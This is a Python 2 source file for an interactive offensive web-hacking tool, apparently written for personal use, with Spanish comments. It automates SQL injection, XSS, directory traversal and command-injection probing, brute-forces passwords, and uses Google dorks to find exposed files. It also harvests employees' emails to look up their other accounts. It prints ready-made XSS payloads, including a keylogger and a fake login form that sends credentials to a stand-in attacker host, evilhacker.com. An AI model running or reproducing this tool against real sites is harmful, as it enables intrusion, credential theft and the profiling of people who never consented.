#!/usr/bin/python2
# -*- coding: iso-8859-15 -*-
# ULTIMATE WEB HACKING TOOL by sha0@badchecksum.net
#
# sha0hack.py v1.0
# TODO: exceptions control, mejorar ayuda, adivinador de parámetros nuevos, echo test -> medir longitud máxima permitida

import sys
sys.path.append('..')
from util.utils import *
import re
import os
import binascii

#TODO: que el google m busque bien lo de neurona y hotmail

def help(mode):
	if mode == '':
		print
		print
		print "--- MODES ---"
		print "a  Analyze Mode"
		print "b  Bruteforce Mode"
		print "c  Crawling Mode"
		print "g  Google Mode"
		print "q  Quit"
	if mode == 'Analyze':
		print "--- ANALYZE ---"
		print "xk 				XSS keylogger"
		print "xf				XSS evil-form"
		print 'e <url>				Echo analisis (## at param value to be analyzed)'
		print "u <url> 				SQL uion fields equilibrator (## bytes in select) " #TODO que de tecte el select el solo, añadir mas ataques SQL
		print "v <url> <num params> 		SQL union type equilibrator (## bytes in select)" #TODO añadir adivinator, apu
		#print ' l file.lnks                                   param-manipulation to every link of the file (firt use crawl to extract the links)'
	if mode == 'Bruteforce':
		print "--- BRUTEFORCE ---"
		print 'f <url>				Post fields bruteforce, since the word incorrect disapear'
		print 'b <url>				Basic auth bruteforce'
	if mode == 'Crawling':
		print "--- CRAWLING ---"
		print 'c <url>				Crawl and export all HTML'
		print 'f <url>				Form enumerator' #TODO massAudit+crawl
		print 'r <regexp>			Find patterns at allHTML (reviously use c)'
	if mode == 'Google':
		print "--- GOOGLE ---"
		print 'm <domain>			Get mails from google, and investigate users'
		print 'o <domain>			Look for hotmail objects at google'	#TODO:añadir froogle
		print 's <keyword>			find keyword in google'

	print "--- OPTIONS --"
	print "cook	Set a cookie"
	print "post	Set a post"
	print "badguy	Set a badguy"
	print "load	Load words to wordlist"
	print "clear	Clear Wordlist"
	print 
	print 
	print
	

def prompt(msg):
	sys.stdout.write(msg)
	sys.stdout.flush()
	return sys.stdin.readline()[:-1];

#Globas
mode=''
cook=''
allhtml=''
post=''
badguy=''
wordlist=[]
nav = Navigator()



def test(url,badguy):
	sys.stdout.write("\r"+url+"                             ") 
	sys.stdout.flush()
	html = nav.go(url)
	if not re.compile(badguy).search(html):
		print 'Correct:'
		print url
		print html
		print url
		sys.exit(1)

def bin(num):
	bin = ""
	while num:
		bin += str(num%2)
		num /= 2
	return bin


def GoogleSearch(key):
	goo = Google()
	par = HtmlParse()
	htm = goo.search(key)
	for i in par.getWords(htm):
		print i

def allHtmlRegexp(target):
	if len(allHtml) == 0:
		print "Crawl first to get all the html"
		return
		
	data = re.compile(target).findall(allhtml)
	if len(data) > 0:
		for i in data:
			print i
	else:
		print "No results"

def echoAnalisis(target):
	filtra=[]
	mark = re.compile('##')
	magic = 'jaklwejsdf'
	veredict=''
	transforma=[]
	dangerBytes = ['\'','"','`','$','-','*','%3f','%26','<','>','(',')',';','%5c','!','\\',',','.','_','@','|','&','/','../']

	if post:
		p = mark.sub(magic,post)
		html = nav.go(target,p)
	else:
		url = mark.sub(magic,target)
		html = nav.go(url)

	if re.compile(magic).findall(html):
		print 'Is vulnerable to echo analysis'

		for i in range(1,255):
			dangerBytes.append("%%%.2x"%i)

		for b in dangerBytes:
			if post:
				p =  mark.sub(b+magic,post)
				html = nav.go(target,p)
			else:
				url = mark.sub(b+magic,target)
				html = nav.go(url)

			htmlEncoded = re.compile('(\&.+\;)'+magic).findall(html)
			resp = re.compile('(.)'+magic).findall(html)
			if resp:
				resp = resp[0]
			else:
				resp=''

			if htmlEncoded:
				resp = htmlEncoded[0]

			if resp:
				# b --> in  c --> in resp --> out
				if len(b) == 3 and b[0] == '%':
					if htmlEncoded:
						veredict = "Sanitized"
						d = b
					else:
						c = re.compile('%').sub('',b)
						d = binascii.a2b_hex(c)

						if resp and resp == b:
							veredict = "Accepted"
						else:
							if resp == d:
								veredict = "Accepted and Decoded"
							else:
								veredict = "Sanitized"
						#d='\\'+d

					print b+'('+d+') ==> '+resp+'    %s' % veredict
				else:
					if resp == b:
						veredict = "Accepted"
					else:
						veredict = "Sanitized"

					print b+'    ==> '+resp+'    %s' % veredict
			else:
				print b+' ==> Filtered'
	else:
		print 'Is not vulnerable to echo analysis'
	sys.exit(1)


		
def equilibrator(target):
	for i in range(1,300):
		target = re.compile('null\+').sub('null,null+',target)
		print target
		test(target,badguy)

	print 'Bad luck!'
	sys.exit(1)

def transformator(target,nulls):
	if nulls > 5:
		print 'Barrera las '+str(pow(3,nulls))+' variaciones que es improducente.'
		#sys.exit(1)
	
	print 'Existen '+str(pow(3,nulls))+' variaciones diferentes, reducidas a: '+str(pow(2,nulls))

	const_str = '\'\''
	const_int = '1'

	#All int
	#params=const_int
	#for i in range(1,nulls):
	#	params=params+','+const_int

	#url = re.compile('##').sub(params,target)
	#test(url,badguy)

	for indice in range(0,pow(2,nulls)):
		b = bin(indice)
		for i in range(len(b),nulls):
			b+='0'

		params=''
		for i in range(0,len(b)):
			if i==0:
				separator=''
			else:
				separator=','

			if b[i] == '0':
				params+=separator+'\'\''
			else:
				params+=separator+'0'
		
		url = re.compile('##').sub(params,target)
		test(url,badguy)
	sys.exit(1)


def basicAuthBrute(target):
	method = 'basic'
	for w in wordlist:
		w = w[:-1]
		sys.stdout.write(w)
		nav.setAuth(method,w,w)
		resp = nav.go(target)
		print resp
		if re.compile('denied').findall(resp):
			 sys.stdout.write(' Denied                     \r')
			 sys.stdout.flush()
		else:
			print ' You get in!'


def googlePeopleSeek(target):
	empleados=[]
	goo = Google()
	parse = HtmlParse()

	htm = goo.search('"@'+target+'"')
	eml = parse.getEmails(htm,target)
	dom = re.compile('@'+target,re.IGNORECASE)
	notfound = re.compile('Error 404',re.IGNORECASE)
	notfound2 = re.compile('La URL solicitada no se encont',re.IGNORECASE)

	for i in eml:
		e = dom.sub('',i)
		sys.stdout.write(i)

		#BlogSpot	
		htm = nav.go('http://'+e+'.blogspot.com')
		if notfound.findall(htm) or notfound2.findall(htm):
			sys.stdout.write('	http://'+e+'.blogspot.com')
		#HotMail
		htm = goo.search('"'+e+'@hotmail.com"')
		emls = parse.getEmails(htm,'hotmail.com')
		if len(emls) > 0:
			sys.stdout.write('	'+emls[0])
		#Neurona
		goo.MAX_PAGES=1
		htm = goo.search('site:neurona.com+'+e)
		lnks = parse.getLinks(htm,'neurona.com')
		if len(lnks) > 0:
			sys.stdout.write('	'+lnks[0])
		print

def formBruteforce(target):
	pb = PostBrute()
	pb.setBadGuy(badguy)
	pb.getForm(target)
	pb.wordlist = wordlist
	if cook:
		pb.setCookie(cook)
	pb.brute()


def crawl(target):
	c = Crawl(target)
	c.go()
	c.saveAll()
	allhtml = c.html

def paramFuzzer(target):
	url = Url()
	parse = HtmlParse()
	att = Attack()

	# Cargar Fichero
	l = open(target,'r')
	lnks = l.readlines()
	l.close()

	# Eliminar objetos repetidos (aunque tengan distintos valores en los params)
	lnks = parse.unique(lnks)
	old=''
	links=[]
	for l in lnks:
		s =  re.compile('=[^&]').sub('',l) # Suprimir valores de los parametros
		if not s == old:
			links.append(l[:-1])
		old=s

	allParams = {}

	for l in links:
		if re.compile('\?').findall(l):	# Solo tratar los que tengan parametros

			# SQL Injection
			url.set(l)
			print url.gen()
			for p in range(0,len(url.params)):
				url.params[p] = re.compile('=[^&]+').sub('='+att.injatt,url.params[p])
			u = url.gen()
			#print u
			htm = nav.go(u)
			for r in att.injresp:
				if re.compile(r).search(htm):
					print 'SQL Injection: '+u+' '+r
					break;
		
			# Cross Site Scripting
			url.set(l)
			for p in range(0,len(url.params)):
				url.params[p] = re.compile('=[^&]+').sub('='+att.xssatt,url.params[p])
			u = url.gen()
			#print u
			htm = nav.go(u)
			for r in att.xssresp:
				if re.compile(r).search(htm):
					print 'XSS: '+u+' '+r
					break;

			# Transversal directory
			url.set(l)
			for t in range(0,len(att.transatt)):
				for p in range(0,len(url.params)):
					url.params[p] = re.compile('=[^&]+').sub('='+att.transatt[t],url.params[p])
				u = url.gen()
				#print u
				htm = nav.go(u)
				if re.compile(att.transresp[t]).search(htm):
					print 'TRANSV: '+u+' '

			# SHELL attack
			url.set(l)
			for c in att.cmdatt:
				for p in range(0,len(url.params)):
					url.params[p] = re.compile('=[^&]+').sub('='+c,url.params[p])
				u = url.gen()
				#print u
				htm = nav.go(u)
				for r in att.cmdresp:
					if re.compile(r).search(htm):
						print 'SHELL: '+u+' '+r

			# Detect shell sleep 6
			url.set(l)
			for p in range(0,len(url.params)):
				url.params[p] = re.compile('=[^&]+').sub('='+att.cmdsleep,url.params[p])
			u = url.gen()
			#print u
			htm = nav.go(u)
			print '>>'+u
			for r in att.cmdresp:
				if re.compile(r).search(htm):
					print 'SHELL: '+u+' '+r



def GoogleObjectScan(target):
	goo = Google()
	parse = HtmlParse()
	interestingExtensions = ['php','asp','jsp','old','bkp','mdb','log','txt','cfm','pl','cgi','pdf','doc']
	dangerObjects = ['upload','shell','cmd','backdoor','passwd','htaccess','administrator','access','private','backoffice','staff']
	htm = ''
	for ext in interestingExtensions:
		htm += goo.search('site:'+target+'+filetype:'+ext)	
	for obj in dangerObjects:
		htm += goo.search('site:'+target+'+allinurl:'+obj)
	lnks = parse.getLinks(htm,target)	
	for l in lnks:
		print l

def dimensioneitor(target):
	c = Crawl2(target)
	c.blacklist.append('link')
	c.go();
	xml = c.exportForms();
	fd = open("/tmp/forms.xml","w")
	fd.write(xml)
	fd.close()
	print "Results at /tmp/forms.xml"


def XSSKeylogger():
	print '"><script>var w=window.open("https://www.vyctim.com/login.html","_top"); w.document.write("<script>document.captureEvents(Event.KEYPRESS);document.onkeypress=keyb_hook;function keyb_hook (key) { var code; var key; if (!key) key = event; if (document.layers) code=key.which; else if(document.all) code=key.keyCode; else if(document.getElementById)   code=key.charCode; alert(\'capturando: \',String.fromCharCode(code));  } <"+"/s"+"cript>");  </script><!--'


def XSSEvilForm():
	print '<form method=post action=http://www.evilhacker.com>User:<input type=text name=user><br>Password:<input type=password name=pwd><br><input type=submit></form>'


print "Press ? for help"
while 1:
	print
	print "cook: "+cook
	print "post: "+post
	print "badGuy: "+badguy
	print "%d words loaded." % len(wordlist)
	cmd=prompt(mode+"==>")

	#Quit
	if cmd == 'q':
		if mode == '':
			sys.exit(1)
		else:
			mode=''
	#Help
	if cmd == '?':
		help(mode)

	#Options
	if cmd == 'cook':
		cook=prompt("Cookie==>")
		nav.setCookie(cook)
	if cmd == 'post':
		post=prompt("Post==>")
	if cmd == 'badguy':
		badguy=prompt("BadGuy==>")
	if cmd == 'load':
		fd = open(wordlist,'r')
		wordlist += fd.readlines()
		fd.close()
	if cmd == 'clear':
		wordlist=[]

	#Change mode
	if mode == '':
		if cmd == 'a':
			mode='Analyze'
		if cmd == 'b':
			mode='Bruteforce'
		if cmd == 'c':
			mode='Crawling'
		if cmd == 'g':
			mode='Google'

	#Attacks
	if mode == 'Analyze':
		if cmd == 'xk':
			XSSKeylogger()
		if cmd == 'xf':
			XSSEvilForm()
		if cmd[0:2] == 'e ':
			echoAnalisys(cmd[2:])
		if cmd[0:2] == 'u ':
			equilibrator(cmd[2:])
		if cmd[0:2] == 'v ':
			num=re.compile(' ([0-9]+) ').findall(cmd)
			transformator(cmd[2:],num)

	if mode == 'Bruteforce':
		if cmd[0:2] == 'f ':
			formBruteforce(cmd[2:])
		if cmd[0:2] == 'b ':
			basicAuthBrute(cmd[2:])
	if mode == 'Crawling':
		if cmd[0:2] == 'c ':
			crawl(cmd[2:])
		if cmd[0:2] == 'f ':
			dimensioneitor(cmd[2:])
		if cmd[0:2] == 'r ':
			allHtmlRegexp(cmd[2:])
	if mode == 'Google':
		if cmd[0:2] == 'm ':
			GooglePeopleSeek(cmd[2:])
		if cmd[0:2] == 'o ':
			GoogleObjectScan(cmd[2:])
		if cmd[0:2] == 's ':
			print "buscando .."
			GoogleSearch(cmd[2:])


